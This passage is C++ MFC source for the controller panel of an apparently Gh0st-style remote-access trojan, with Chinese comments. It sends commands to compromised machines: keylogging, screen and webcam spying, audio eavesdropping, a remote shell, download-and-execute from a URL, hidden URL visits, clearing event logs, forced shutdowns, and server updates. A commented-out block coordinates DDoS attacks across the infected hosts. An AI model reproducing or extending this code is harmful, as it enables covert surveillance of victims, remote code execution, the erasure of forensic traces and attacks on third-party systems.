	dlg->Create(IDD_KEYBOARD, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	
	pContext->m_Dialog[0] = KEYBOARD_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

LRESULT CClientView::OnOpenSystemDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext	*pContext = (ClientContext *)lParam;
	CSystemDlg	*dlg = new CSystemDlg(this, m_iocpServer, pContext);
	
	// 设置父窗口为卓面
	dlg->Create(IDD_SYSTEM, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	
	pContext->m_Dialog[0] = SYSTEM_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}


LRESULT CClientView::OnOpenShellDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext	*pContext = (ClientContext *)lParam;
	CShellDlg	*dlg = new CShellDlg(this, m_iocpServer, pContext);
	
	// 设置父窗口为卓面
	dlg->Create(IDD_SHELL, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	
	pContext->m_Dialog[0] = SHELL_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

void CClientView::OnFilemanager()
{
	// TODO: Add your command handler code here
	BYTE	bToken = COMMAND_LIST_DRIVE;
	SendSelectCommand(&bToken, sizeof(BYTE));
}

void CClientView::OnScreenspy() 
{
	// TODO: Add your command handler code here
	BYTE	bToken = COMMAND_SCREEN_SPY;
	SendSelectCommand(&bToken, sizeof(BYTE));
}

void CClientView::OnWebcam() 
{
	BYTE	bToken = COMMAND_WEBCAM;
	SendSelectCommand(&bToken, sizeof(BYTE));
}


void CClientView::OnAudioListen() 
{
	// TODO: Add your command handler code here
	BYTE	bToken = COMMAND_AUDIO;
	SendSelectCommand(&bToken, sizeof(BYTE));	
}

void CClientView::OnDownexec() 
{
	// TODO: Add your command handler code here

	CInputDialog	dlg;
	dlg.Init(_T("下载者"), _T("请输入要下载文件的地址:"), this);
	if (dlg.DoModal() != IDOK)   
		return;
	dlg.m_str.MakeLower();
	if (dlg.m_str.Find(_T("http://")) == -1)
	{
		MessageBox(_T("输入的网址不合法"), _T("错误"));
		return;
	}

	int		nPacketLength = dlg.m_str.GetLength() + 2;
	LPBYTE	lpPacket = new BYTE[nPacketLength];
	lpPacket[0] = COMMAND_DOWN_EXEC;
	memcpy(lpPacket + 1, dlg.m_str.GetBuffer(0), nPacketLength - 1);

	SendSelectCommand(lpPacket, nPacketLength);

	delete[] lpPacket;
}


void CClientView::OnRemove() 
{
	// TODO: Add your command handler code here
	if (MessageBox(_T("确认卸载服务端吗?"), _T("警告"), MB_YESNO | MB_ICONWARNING) == IDNO)
		return;
	BYTE	bToken = COMMAND_REMOVE;
	SendSelectCommand(&bToken, sizeof(BYTE));	
}


void CClientView::OnKeyboard() 
{
	// TODO: Add your command handler code here
	BYTE	bToken = COMMAND_KEYBOARD;
	SendSelectCommand(&bToken, sizeof(BYTE));
}

void CClientView::OnSystem() 
{
	// TODO: Add your command handler code here
	BYTE	bToken = COMMAND_SYSTEM;
	SendSelectCommand(&bToken, sizeof(BYTE));	
}

void CClientView::OnRemoteshell() 
{
	// TODO: Add your command handler code here
	BYTE	bToken = COMMAND_SHELL;
	SendSelectCommand(&bToken, sizeof(BYTE));	
}

void CClientView::OnLogoff() 
{
	// TODO: Add your command handler code here
	if (MessageBox(_T("确认注销吗?"), _T("警告"), MB_YESNO | MB_ICONWARNING) == IDNO)
		return;

	BYTE bToken[2];
	bToken[0] = COMMAND_SESSION;
	bToken[1] = EWX_LOGOFF | EWX_FORCE;
	SendSelectCommand((LPBYTE)&bToken, sizeof(bToken));
}

void CClientView::OnReboot() 
{
	// TODO: Add your command handler code here
	if (MessageBox(_T("确认重启吗?"), _T("警告"), MB_YESNO | MB_ICONWARNING) == IDNO)
		return;

	BYTE bToken[2];
	bToken[0] = COMMAND_SESSION;
	bToken[1] = EWX_REBOOT | EWX_FORCE;
	SendSelectCommand((LPBYTE)&bToken, sizeof(bToken));	
}

void CClientView::OnShutdown() 
{
	// TODO: Add your command handler code here

	if (MessageBox(_T("确认关机吗?"), _T("警告"), MB_YESNO | MB_ICONWARNING) == IDNO)
		return;

	BYTE bToken[2];
	bToken[0] = COMMAND_SESSION;
	bToken[1] = EWX_SHUTDOWN | EWX_FORCE;
	SendSelectCommand((LPBYTE)&bToken, sizeof(bToken));	
}

void CClientView::OnSelectAll() 
{
	// TODO: Add your command handler code here
	for (int i = 0; i < m_pListCtrl->GetItemCount(); i++)   
	{   
		m_pListCtrl->SetItemState(i, LVIS_SELECTED, LVIS_SELECTED);
		m_pListCtrl->SetCheck(i,TRUE);
	}
}

void CClientView::OnUnselectAll() 
{
	// TODO: Add your command handler code here
	for (int i = 0; i < m_pListCtrl->GetItemCount(); i++)   
	{   
		m_pListCtrl->SetItemState(i, 0, LVIS_SELECTED);
		m_pListCtrl->SetCheck(i,FALSE);
	}
}

void CClientView::OnOpenUrlHide() 
{
	// TODO: Add your command handler code here

	CInputDialog	dlg;
	dlg.Init(_T("远程访问网址"), _T("请输入要隐藏访问的网址:"), this);
	if (dlg.DoModal() != IDOK)   
		return;
	dlg.m_str.MakeLower();
	if (dlg.m_str.Find(_T("http://")) == -1)
	{
		MessageBox(_T("输入的网址不合法"), _T("错误"));
		return;
	}
	
	int		nPacketLength = dlg.m_str.GetLength() + 2;
	LPBYTE	lpPacket = new BYTE[nPacketLength];
	lpPacket[0] = COMMAND_OPEN_URL_HIDE;
	memcpy(lpPacket + 1, dlg.m_str.GetBuffer(0), nPacketLength - 1);
	
	SendSelectCommand(lpPacket, nPacketLength);
	
	delete[] lpPacket;	
}

void CClientView::OnOpenUrlShow() 
{
	// TODO: Add your command handler code here
	CInputDialog	dlg;
	dlg.Init(_T("远程访问网址"), _T("请输入要显示访问的网址:"), this);
	if (dlg.DoModal() != IDOK)   
		return;
	dlg.m_str.MakeLower();
	if (dlg.m_str.Find(_T("http://")) == -1)
	{
		MessageBox(_T("输入的网址不合法"), _T("错误"));
		return;
	}
	
	int		nPacketLength = dlg.m_str.GetLength() + 2;
	LPBYTE	lpPacket = new BYTE[nPacketLength];
	lpPacket[0] = COMMAND_OPEN_URL_SHOW;
	memcpy(lpPacket + 1, dlg.m_str.GetBuffer(0), nPacketLength - 1);
	
	SendSelectCommand(lpPacket, nPacketLength);
	
	delete[] lpPacket;	
}

void CClientView::OnCleanevent()
{
	// TODO: Add your command handler code here
	BYTE	bToken = COMMAND_CLEAN_EVENT;
	SendSelectCommand(&bToken, sizeof(BYTE));	
}

void CClientView::OnRenameRemark() 
{
	// TODO: Add your command handler code here

	CString strTitle;
	if (m_pListCtrl->GetSelectedCount() == 1)
		strTitle.Format(_T("更改主机(%s)的备注"), m_pListCtrl->GetItemText(m_pListCtrl->GetSelectionMark(), 3));
	else
		strTitle = _T("批量更改主机备注");
	CInputDialog	dlg;
	dlg.Init(strTitle, _T("请输入新的备注:"), this);
	if (dlg.DoModal() != IDOK || dlg.m_str.GetLength()== 0)   
		return;
	
	int		nPacketLength = dlg.m_str.GetLength() + 2;
	LPBYTE	lpPacket = new BYTE[nPacketLength];
	lpPacket[0] = COMMAND_RENAME_REMARK;
	memcpy(lpPacket + 1, dlg.m_str.GetBuffer(0), nPacketLength - 1);
	
	SendSelectCommand(lpPacket, nPacketLength);
	
	POSITION pos = m_pListCtrl->GetFirstSelectedItemPosition();
	while(pos)
	{
		int	nItem = m_pListCtrl->GetNextSelectedItem(pos);
		m_pListCtrl->SetItemText(nItem, 3, dlg.m_str);
	}

	delete[] lpPacket;		
}

void CClientView::OnUpdateServer() 
{
	// TODO: Add your command handler code here
	CInputDialog	dlg;
	dlg.Init(_T("下载更新服务端"), _T("请输入要下载新服务端的地址:"), this);
	if (dlg.DoModal() != IDOK)   
		return;
	dlg.m_str.MakeLower();
	if (dlg.m_str.Find(_T("http://")) == -1)
	{
		MessageBox(_T("输入的网址不合法"), _T("错误"));
		return;
	}
	
	int		nPacketLength = dlg.m_str.GetLength() + 2;
	LPBYTE	lpPacket = new BYTE[nPacketLength];
	lpPacket[0] = COMMAND_UPDATE_SERVER;
	memcpy(lpPacket + 1, dlg.m_str.GetBuffer(0), nPacketLength - 1);
	
	SendSelectCommand(lpPacket, nPacketLength);
	
	delete[] lpPacket;	
}

void CClientView::OnDisconnect() 
{
	// TODO: Add your command handler code here
	POSITION pos = m_pListCtrl->GetFirstSelectedItemPosition();
	CString strOSCount,IPaddress,strLogText,strDiLi;
	while (pos) 
	{
		int i = m_pListCtrl->GetNextSelectedItem(pos);
		IPaddress = m_pListCtrl->GetItemText( i, 1 );
		if (((CClientApp *)AfxGetApp())->m_bIsQQwryExist)
		{
			//地理位置
			strDiLi = m_pListCtrl->GetItemText( i, 12 );
			m_pListCtrl->SetItemText(i, 12, strDiLi);
			IPaddress += "-";
			IPaddress += strDiLi;
		}
		strOSCount = m_pListCtrl->GetItemText( i, 4 );
		if ( strOSCount.Find(_T("NT")) != -1 )
		{
			g_pFrame->nOSCount[0]--;
		}
		if ( strOSCount.Find(_T("XP")) != -1 )
		{
			g_pFrame->nOSCount[2]--;
		}
		if ( strOSCount.Find(_T("Vista")) != -1 )
		{
			g_pFrame->nOSCount[4]--;
		}
		if ( strOSCount.Find(_T("Win 7")) != -1 )
		{
			g_pFrame->nOSCount[6]--;
		}
		if ( strOSCount.Find(_T("2000")) != -1 )
		{
			g_pFrame->nOSCount[1]--;
		}
		if ( strOSCount.Find(_T("2003")) != -1 )
		{
			g_pFrame->nOSCount[3]--;
		}
		if ( strOSCount.Find(_T("2008")) != -1 )
		{
			g_pFrame->nOSCount[5]--;
		}
		strLogText.Format( "主机断线:[%s]",IPaddress);
//		g_pLogView->AddToLog(strLogText);
		m_pListCtrl->DeleteItem(m_pListCtrl->GetNextSelectedItem(pos));	
	}
	g_pTabView->UpDateNumber();
	g_pFrame->ShowConnectionsNumber();
	g_pFrame->ShowOSCount();
}


void CClientView::OnShowmsg() 
{
	// TODO: Add your command handler code here
	CMsgBox dlg;
	dlg.DoModal();
}

void CClientView::OnSysinfo() 
{
	// TODO: Add your command handler code here
	BYTE	bToken = COMMAND_SYSINFO;
	SendSelectCommand(&bToken, sizeof(BYTE));
}

LRESULT CClientView::OnOpenSysInfoDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext	*pContext = (ClientContext *)lParam;
	CSysInfo	*dlg = new CSysInfo(this, m_iocpServer, pContext);
	
	// 设置父窗口为卓面
	dlg->Create(IDD_SYSINFO, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	
	pContext->m_Dialog[0] = SYSINFO_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

//void CClientView::OnDdos() 
//{
//	// TODO: Add your command handler code here
//	static CDDOSAttackDlg *m_Attack =NULL;
//	if(m_Attack==NULL)
//	{
//		m_Attack= new CDDOSAttackDlg;
//		m_Attack->Point=this;
//		m_Attack->Create(IDD_ATTACK_DIALOG,GetDesktopWindow());
//	}	
//	m_Attack->ShowWindow(SW_SHOW);
//}
//
//VOID CClientView::SendAutoAttack(ClientContext *Context)
//{
//	if(m_AutoAttack == FALSE)
//		return;
//	
//	CClientView* pView = NULL;
//	int nTabs = g_pTabView->m_wndTabControl.GetItemCount();
//	int newnum = 0 ;
//	for (int k = 0 ; k < nTabs; k++ )
//	{
//		pView = DYNAMIC_DOWNCAST(CClientView, CWnd::FromHandle(g_pTabView->m_wndTabControl.GetItem(k)->GetHandle()));			
//		int num = pView->m_pListCtrl->GetItemCount();
//		newnum = newnum + num ;//获取总共主机
//	}
//	
//	for (int n = 0; n < nTabs; n++ )
//	{
//		pView = DYNAMIC_DOWNCAST(CClientView, CWnd::FromHandle(g_pTabView->m_wndTabControl.GetItem(n)->GetHandle()));
//		int nCnt = pView->m_pListCtrl->GetItemCount();
//		for ( int i = 0; i < nCnt; i++)
//		{
//			WORD nSize = sizeof(ATTACK);
//			
//			LPBYTE pData = new BYTE[nSize+1];
//			
//			pData[0]=COMMAND_DDOS_ATTACK;//命令消息..
//			ATTACK m_Send;
//			memcpy(&m_Send,&m_AutoAttackData,nSize);
//			
//			memcpy(pData+1,&m_Send,nSize);	
//			
//			pView->m_iocpServer->Send(Context, pData, nSize+1);
//			
//			DWORD iCount = pView->m_pListCtrl->GetItemCount();
//			char StrShow[20]={NULL};
//			wsprintf(StrShow,"任务 %d",m_AutoTask);
//			
//			pView->m_pListCtrl->SetItemText(iCount-1,10,StrShow);
//			delete[] pData;
//		}
//	}
//}
//
//WORD CClientView::SendDDostStopCommand(WORD iTaskID)
//{
//	DWORD iCount = m_pListCtrl->GetItemCount();
//	WORD Count =0;
//	CHAR szStatus[500]={NULL};
//	
//	CHAR szTask[20]={NULL};
//	wsprintf(szTask,"任务 %d",iTaskID);
//	
//	BYTE pData[2]={COMMAND_DDOS_STOP,0};
//	
//	//停止掉自动
//	if(iTaskID == m_AutoTask)
//		m_AutoAttack = FALSE;
//	
//	//检查主机是否空闲状态遍历分组选中发送
//	CClientView* pView = NULL;
//	int nTabs = g_pTabView->m_wndTabControl.GetItemCount();
//	int newnum = 0 ;
//	for (int k = 0 ; k < nTabs; k++ )
//	{
//		pView = DYNAMIC_DOWNCAST(CClientView, CWnd::FromHandle(g_pTabView->m_wndTabControl.GetItem(k)->GetHandle()));			
//		int num = pView->m_pListCtrl->GetItemCount();
//		newnum = newnum + num ;//获取总共主机
//	}
//	
//	for (int n = 0; n < nTabs; n++ )
//	{
//		pView = DYNAMIC_DOWNCAST(CClientView, CWnd::FromHandle(g_pTabView->m_wndTabControl.GetItem(n)->GetHandle()));
//		int nCnt = pView->m_pListCtrl->GetItemCount();
//		for ( int i = 0; i < nCnt; i++)
//		{		
//			pView->m_pListCtrl->GetItemText(i,10,szStatus,500);
//			if(strcmp(szStatus,szTask)==0)
//			{
//				ClientContext* pContext = (ClientContext*)pView->m_pListCtrl->GetItemData(i);
//				// 发送DDOS 攻击命令
//				pView->m_iocpServer->Send(pContext, &pData[0], 2);
//				Count++;
//				pView->m_pListCtrl->SetItemText(i,10,"空闲");
//			}
//		}
//	}
//	return Count;
//}
//
//WORD CClientView::SendDDosAttackCommand(LPATTACK m_Attack,INT HostNums,BOOL AutoAttack,WORD iTaskID)
//{	
//	DWORD iCount = m_pListCtrl->GetItemCount();
//	
//	WORD nSize = sizeof(ATTACK);
//	
//	LPBYTE pData = new BYTE[nSize+1];
//	
//	pData[0]=COMMAND_DDOS_ATTACK;//命令消息..
//	ATTACK m_Send;
//	memcpy(&m_Send,m_Attack,nSize);
//	
//	memcpy(pData+1,&m_Send,nSize);
//	
//	WORD Count = 0;
//	CHAR szStatus[500]={NULL};
//	CHAR szTask[20]={NULL};
//	wsprintf(szTask,"任务 %d",iTaskID);
//	
//	//说明是选中主机
//	if(HostNums==-1)
//	{
//		CClientView* pView = NULL;
//		int nTabs = g_pTabView->m_wndTabControl.GetItemCount();
//		int newnum = 0 ;
//		for (int k = 0 ; k < nTabs; k++ )
//		{
//			pView = DYNAMIC_DOWNCAST(CClientView, CWnd::FromHandle(g_pTabView->m_wndTabControl.GetItem(k)->GetHandle()));			
//			int num = pView->m_pListCtrl->GetItemCount();
//			newnum = newnum + num ;//获取总共主机
//		}
//		for (int n = 0; n < nTabs; n++ )
//		{
//			pView = DYNAMIC_DOWNCAST(CClientView, CWnd::FromHandle(g_pTabView->m_wndTabControl.GetItem(n)->GetHandle()));
//			int nCnt = pView->m_pListCtrl->GetItemCount();
//			for ( int i = 0; i < nCnt; i++)
//			{
//				if(pView->m_pListCtrl->GetCheck(i))
//				{
//					//检查主机是否空闲状态
//					pView->m_pListCtrl->GetItemText(i,10,szStatus,500);
//					if(strcmp(szStatus,"空闲")==0)
//					{
//						ClientContext* pContext = (ClientContext*)pView->m_pListCtrl->GetItemData(i);
//						// 发送DDOS 攻击命令
//						pView->m_iocpServer->Send(pContext, pData, nSize+1);
//						Count++;
//						pView->m_pListCtrl->SetItemText(i,10,szTask);
//					}
//				}
//			}
//		}
//	}
//	else
//	{
//		if(iCount<HostNums)
//			HostNums = iCount;
//		CClientView* pView = NULL;
//		int nTabs = g_pTabView->m_wndTabControl.GetItemCount();
//		int newnum = 0 ;
//		for (int k = 0 ; k < nTabs; k++ )
//		{
//			pView = DYNAMIC_DOWNCAST(CClientView, CWnd::FromHandle(g_pTabView->m_wndTabControl.GetItem(k)->GetHandle()));			
//			int num = pView->m_pListCtrl->GetItemCount();
//			newnum = newnum + num ;//获取总共主机
//		}
//		for (int n = 0; n < nTabs; n++ )
//		{
//			pView = DYNAMIC_DOWNCAST(CClientView, CWnd::FromHandle(g_pTabView->m_wndTabControl.GetItem(n)->GetHandle()));
//			int nCnt = pView->m_pListCtrl->GetItemCount();
//			for (DWORD i=0;i<HostNums;i++)
//			{
//				//检查主机是否空闲状态
//				pView->m_pListCtrl->GetItemText(i,10,szStatus,500);
//				if(strcmp(szStatus,"空闲")==0)
//				{
//					ClientContext* pContext = (ClientContext*)pView->m_pListCtrl->GetItemData(i);
//					// 发送DDOS 攻击命令
//					pView->m_iocpServer->Send(pContext, pData, nSize+1);
//					Count++;
//					pView->m_pListCtrl->SetItemText(i,10,szTask);
//				}
//			}
//		}
//	}
//	delete []pData;
//	
//	if(AutoAttack)
//	{
//		m_AutoAttack = TRUE;
//		m_AutoTask = iTaskID;
//		memcpy(&m_AutoAttackData,m_Attack,sizeof(ATTACK));
//	}
//	
//	return Count;
//}
